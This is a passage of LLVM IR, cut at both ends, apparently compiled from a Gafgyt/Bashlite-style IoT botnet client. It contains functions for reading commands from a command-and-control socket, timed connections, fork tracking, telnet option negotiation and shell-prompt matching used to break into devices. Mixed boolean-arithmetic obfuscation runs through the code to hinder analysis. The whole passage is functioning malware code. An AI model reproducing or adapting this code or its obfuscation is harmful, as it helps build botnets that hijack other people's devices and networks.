  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %27

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 1080722044
  %14 = add i32 %13, 65
  %15 = sub i32 %14, 1080722044
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = sub i32 0, 1
  %25 = sub i32 %23, %24
  %26 = add nsw i32 %23, 1
  store i32 %25, i32* %5, align 4
  br label %6

; <label>:27:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 -5574367462820324636, -1
  %47 = and i64 %44, -5574367462820324636
  %48 = and i64 %43, %46
  %49 = and i64 %45, -5574367462820324636
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 -5574367462820324636, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = add i32 %60, 1870743206
  %62 = add i32 %61, 1
  %63 = sub i32 %62, 1870743206
  %64 = add nsw i32 %60, 1
  %65 = call i32 @select(i32 %63, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %65, i32* %12, align 4
  %66 = icmp sle i32 %65, 0
  br i1 %66, label %67, label %114

; <label>:67:                                     ; preds = %33
  br label %68

; <label>:68:                                     ; preds = %106, %67
  %69 = load i32, i32* %13, align 4
  %70 = icmp slt i32 %69, 10
  br i1 %70, label %71, label %113

; <label>:71:                                     ; preds = %68
  %72 = load i32, i32* @mainCommSock, align 4
  %73 = call i32 (i32, i8*, ...) @sockprintf(i32 %72, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0))
  %74 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %74, align 8
  %75 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %75, align 8
  br label %76

; <label>:76:                                     ; preds = %71
  %77 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %77, i64 0, i64 0
  %79 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %78) #2, !srcloc !2
  %80 = extractvalue { i64, i64* } %79, 0
  %81 = extractvalue { i64, i64* } %79, 1
  %82 = trunc i64 %80 to i32
  store i32 %82, i32* %14, align 4
  %83 = ptrtoint i64* %81 to i64
  %84 = trunc i64 %83 to i32
  store i32 %84, i32* %15, align 4
  br label %85

; <label>:85:                                     ; preds = %76
  %86 = load i32, i32* %5, align 4
  %87 = srem i32 %86, 64
  %88 = zext i32 %87 to i64
  %89 = shl i64 1, %88
  %90 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %91 = load i32, i32* %5, align 4
  %92 = sdiv i32 %91, 64
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [16 x i64], [16 x i64]* %90, i64 0, i64 %93
  %95 = load i64, i64* %94, align 8
  %96 = and i64 %95, %89
  %97 = xor i64 %95, %89
  %98 = or i64 %96, %97
  %99 = or i64 %95, %89
  store i64 %98, i64* %94, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sub i32 0, 1
  %102 = sub i32 %100, %101
  %103 = add nsw i32 %100, 1
  %104 = call i32 @select(i32 %102, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %104, i32* %12, align 4
  %105 = icmp sle i32 %104, 0
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %85
  %107 = load i32, i32* %13, align 4
  %108 = sub i32 %107, 2002646955
  %109 = add i32 %108, 1
  %110 = add i32 %109, 2002646955
  %111 = add nsw i32 %107, 1
  store i32 %110, i32* %13, align 4
  br label %68

; <label>:112:                                    ; preds = %85
  br label %113

; <label>:113:                                    ; preds = %112, %68
  br label %114

; <label>:114:                                    ; preds = %113, %33
  store i32 0, i32* %18, align 4
  %115 = load i8*, i8** %6, align 8
  store i8* %115, i8** %17, align 8
  br label %116

; <label>:116:                                    ; preds = %137, %114
  %117 = load i32, i32* %7, align 4
  %118 = sub i32 %117, -1591700690
  %119 = add i32 %118, -1
  %120 = add i32 %119, -1591700690
  %121 = add nsw i32 %117, -1
  store i32 %120, i32* %7, align 4
  %122 = icmp sgt i32 %117, 1
  br i1 %122, label %123, label %143

; <label>:123:                                    ; preds = %116
  %124 = load i32, i32* @mainCommSock, align 4
  %125 = call i64 @recv(i32 %124, i8* %16, i64 1, i32 0)
  %126 = icmp ne i64 %125, 1
  br i1 %126, label %127, label %129

; <label>:127:                                    ; preds = %123
  %128 = load i8*, i8** %17, align 8
  store i8 0, i8* %128, align 1
  store i32 -1, i32* %4, align 4
  br label %146

; <label>:129:                                    ; preds = %123
  %130 = load i8, i8* %16, align 1
  %131 = load i8*, i8** %17, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %17, align 8
  store i8 %130, i8* %131, align 1
  %133 = load i8, i8* %16, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %134, 10
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %129
  br label %143

; <label>:137:                                    ; preds = %129
  %138 = load i32, i32* %18, align 4
  %139 = sub i32 %138, 1046169976
  %140 = add i32 %139, 1
  %141 = add i32 %140, 1046169976
  %142 = add nsw i32 %138, 1
  store i32 %141, i32* %18, align 4
  br label %116

; <label>:143:                                    ; preds = %136, %116
  %144 = load i8*, i8** %17, align 8
  store i8 0, i8* %144, align 1
  %145 = load i32, i32* %18, align 4
  store i32 %145, i32* %4, align 4
  br label %146

; <label>:146:                                    ; preds = %143, %127
  %147 = load i32, i32* %4, align 4
  ret i32 %147
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = xor i64 %22, -1
  %24 = xor i64 2048, -1
  %25 = xor i64 -6746102430076887845, -1
  %26 = and i64 %23, -6746102430076887845
  %27 = and i64 %22, %25
  %28 = and i64 %24, -6746102430076887845
  %29 = and i64 2048, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 -6746102430076887845, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %22, 2048
  store i64 %37, i64* %15, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i64, i64* %15, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %39, i32 4, i64 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %123

; <label>:52:                                     ; preds = %4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %6, align 4
  %56 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 16)
  store i32 %57, i32* %16, align 4
  %58 = load i32, i32* %16, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %111

; <label>:60:                                     ; preds = %52
  %61 = call i32* @__errno_location() #13
  %62 = load i32, i32* %61, align 4
  %63 = icmp eq i32 %62, 115
  br i1 %63, label %64, label %109

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %66, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %68, align 8
  br label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %71 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 0
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %71) #2, !srcloc !3
  %73 = extractvalue { i64, i64* } %72, 0
  %74 = extractvalue { i64, i64* } %72, 1
  %75 = trunc i64 %73 to i32
  store i32 %75, i32* %17, align 4
  %76 = ptrtoint i64* %74 to i64
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %69
  %79 = load i32, i32* %6, align 4
  %80 = srem i32 %79, 64
  %81 = zext i32 %80 to i64
  %82 = shl i64 1, %81
  %83 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %84 = load i32, i32* %6, align 4
  %85 = sdiv i32 %84, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = and i64 %88, %82
  %90 = xor i64 %88, %82
  %91 = or i64 %89, %90
  %92 = or i64 %88, %82
  store i64 %91, i64* %87, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 0, 1
  %95 = sub i32 %93, %94
  %96 = add nsw i32 %93, 1
  %97 = call i32 @select(i32 %95, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %98 = icmp sgt i32 %97, 0
  br i1 %98, label %99, label %107

; <label>:99:                                     ; preds = %78
  store i32 4, i32* %13, align 4
  %100 = load i32, i32* %6, align 4
  %101 = bitcast i32* %14 to i8*
  %102 = call i32 @getsockopt(i32 %100, i32 1, i32 4, i8* %101, i32* %13) #2
  %103 = load i32, i32* %14, align 4
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %99
  store i32 0, i32* %5, align 4
  br label %123

; <label>:106:                                    ; preds = %99
  br label %108

; <label>:107:                                    ; preds = %78
  store i32 0, i32* %5, align 4
  br label %123

; <label>:108:                                    ; preds = %106
  br label %110

; <label>:109:                                    ; preds = %60
  store i32 0, i32* %5, align 4
  br label %123

; <label>:110:                                    ; preds = %108
  br label %111

; <label>:111:                                    ; preds = %110, %52
  %112 = load i32, i32* %6, align 4
  %113 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 3, i8* null)
  %114 = sext i32 %113 to i64
  store i64 %114, i64* %15, align 8
  %115 = load i64, i64* %15, align 8
  %116 = xor i64 -2049, -1
  %117 = xor i64 %115, %116
  %118 = and i64 %117, %115
  %119 = and i64 %115, -2049
  store i64 %118, i64* %15, align 8
  %120 = load i32, i32* %6, align 4
  %121 = load i64, i64* %15, align 8
  %122 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 4, i64 %121)
  store i32 1, i32* %5, align 4
  br label %123

; <label>:123:                                    ; preds = %111, %109, %107, %105, %51
  %124 = load i32, i32* %5, align 4
  ret i32 %124
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %59

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 0, 1
  %13 = sub i64 %11, %12
  %14 = add i64 %11, 1
  store i64 %13, i64* @numpids, align 8
  %15 = load i64, i64* @numpids, align 8
  %16 = sub i64 %15, 1526217659929603586
  %17 = add i64 %16, 1
  %18 = add i64 %17, 1526217659929603586
  %19 = add i64 %15, 1
  %20 = mul i64 %18, 4
  %21 = call noalias i8* @malloc(i64 %20) #2
  %22 = bitcast i8* %21 to i32*
  store i32* %22, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %23

; <label>:23:                                     ; preds = %41, %10
  %24 = load i32, i32* %4, align 4
  %25 = zext i32 %24 to i64
  %26 = load i64, i64* @numpids, align 8
  %27 = sub i64 0, 1
  %28 = add i64 %26, %27
  %29 = sub i64 %26, 1
  %30 = icmp ult i64 %25, %28
  br i1 %30, label %31, label %46

; <label>:31:                                     ; preds = %23
  %32 = load i32*, i32** @pids, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  %36 = load i32, i32* %35, align 4
  %37 = load i32*, i32** %3, align 8
  %38 = load i32, i32* %4, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds i32, i32* %37, i64 %39
  store i32 %36, i32* %40, align 4
  br label %41

; <label>:41:                                     ; preds = %31
  %42 = load i32, i32* %4, align 4
  %43 = sub i32 0, 1
  %44 = sub i32 %42, %43
  %45 = add i32 %42, 1
  store i32 %44, i32* %4, align 4
  br label %23

; <label>:46:                                     ; preds = %23
  %47 = load i32, i32* %2, align 4
  %48 = load i32*, i32** %3, align 8
  %49 = load i64, i64* @numpids, align 8
  %50 = add i64 %49, 1143577776358009794
  %51 = sub i64 %50, 1
  %52 = sub i64 %51, 1143577776358009794
  %53 = sub i64 %49, 1
  %54 = getelementptr inbounds i32, i32* %48, i64 %52
  store i32 %47, i32* %54, align 4
  %55 = load i32*, i32** @pids, align 8
  %56 = bitcast i32* %55 to i8*
  call void @free(i8* %56) #2
  %57 = load i32*, i32** %3, align 8
  store i32* %57, i32** @pids, align 8
  %58 = load i32, i32* %2, align 4
  store i32 %58, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %46, %8
  %60 = load i32, i32* %1, align 4
  ret i32 %60
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %114, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %120

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %84, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %82

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = add i64 0, -6611882519379590011
  %30 = sub i64 %29, %28
  %31 = sub i64 %30, -6611882519379590011
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %80, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = add i64 0, %44
  %46 = sub i64 0, %43
  %47 = getelementptr inbounds i8, i8* %41, i64 %45
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %80, label %51

; <label>:51:                                     ; preds = %37
  %52 = load i8*, i8** %3, align 8
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = add i64 0, -6868725165633145926
  %59 = sub i64 %58, %57
  %60 = sub i64 %59, -6868725165633145926
  %61 = sub i64 0, %57
  %62 = getelementptr inbounds i8, i8* %55, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 13
  br i1 %65, label %80, label %66

; <label>:66:                                     ; preds = %51
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, %72
  %74 = add i64 0, %73
  %75 = sub i64 0, %72
  %76 = getelementptr inbounds i8, i8* %70, i64 %74
  %77 = load i8, i8* %76, align 1
  %78 = sext i8 %77 to i32
  %79 = icmp eq i32 %78, 10
  br label %80

; <label>:80:                                     ; preds = %66, %51, %37, %22
  %81 = phi i1 [ true, %51 ], [ true, %37 ], [ true, %22 ], [ %79, %66 ]
  br label %82

; <label>:82:                                     ; preds = %80, %18
  %83 = phi i1 [ false, %18 ], [ %81, %80 ]
  br i1 %83, label %84, label %91

; <label>:84:                                     ; preds = %82
  %85 = load i32, i32* %7, align 4
  %86 = sub i32 0, %85
  %87 = sub i32 0, 1
  %88 = add i32 %86, %87
  %89 = sub i32 0, %88
  %90 = add nsw i32 %85, 1
  store i32 %89, i32* %7, align 4
  br label %18

; <label>:91:                                     ; preds = %82
  %92 = load i8*, i8** %3, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i32, i32* %7, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 0, -2081466473664678603
  %99 = sub i64 %98, %97
  %100 = sub i64 %99, -2081466473664678603
  %101 = sub i64 0, %97
  %102 = getelementptr inbounds i8, i8* %95, i64 %100
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = load i8*, i8** %4, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %104, %110
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %91
  store i32 1, i32* %2, align 4
  br label %121

; <label>:113:                                    ; preds = %91
  br label %114

; <label>:114:                                    ; preds = %113
  %115 = load i32, i32* %6, align 4
  %116 = sub i32 %115, -1538758403
  %117 = add i32 %116, 1
  %118 = add i32 %117, -1538758403
  %119 = add nsw i32 %115, 1
  store i32 %118, i32* %6, align 4
  br label %11

; <label>:120:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %121

; <label>:121:                                    ; preds = %120, %112
  %122 = load i32, i32* %2, align 4
  ret i32 %122
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %150, %8
  %34 = load i32, i32* %18, align 4
  %35 = sub i32 %34, -1387909283
  %36 = add i32 %35, 2
  %37 = add i32 %36, -1387909283
  %38 = add nsw i32 %34, 2
